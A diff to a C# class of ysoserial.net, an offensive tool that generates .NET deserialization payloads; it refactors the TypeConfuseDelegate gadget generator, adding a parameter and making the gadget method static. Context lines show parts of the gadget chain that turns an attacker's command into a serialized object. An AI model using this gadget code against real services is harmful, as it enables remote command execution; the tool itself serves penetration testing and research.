@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Reflection;
+using ysoserial.Helpers;
 
 namespace ysoserial.Generators
 {
@@ -23,18 +24,23 @@ namespace ysoserial.Generators
             return "James Forshaw";
         }
 
+        public override bool isDerived()
+        {
+            return false;
+        }
+
         public override List<string> SupportedFormatters()
         {
             return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "NetDataContractSerializer", "LosFormatter" };
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
+        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify, Boolean useSimpleType)
         {
-            return Serialize(TypeConfuseDelegateGadget(cmd), formatter, test, minify);
+            return Serialize(TypeConfuseDelegateGadget(cmd), formatter, test, minify, useSimpleType);
         }
 
         /* this can be used easily by the plugins as well */
-        public object TypeConfuseDelegateGadget(string cmd)
+        public static object TypeConfuseDelegateGadget(string cmd)
         {
             String potentialCmdFile = cmd.Replace("cmd /c ", ""); // as we add this automatically to the command
 
@@ -45,7 +51,7 @@ namespace ysoserial.Generators
             }
 
             Boolean hasArgs;
-            string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, out hasArgs);
+            string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, out hasArgs);
 
             Delegate da = new Comparison<string>(String.Compare);
             Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
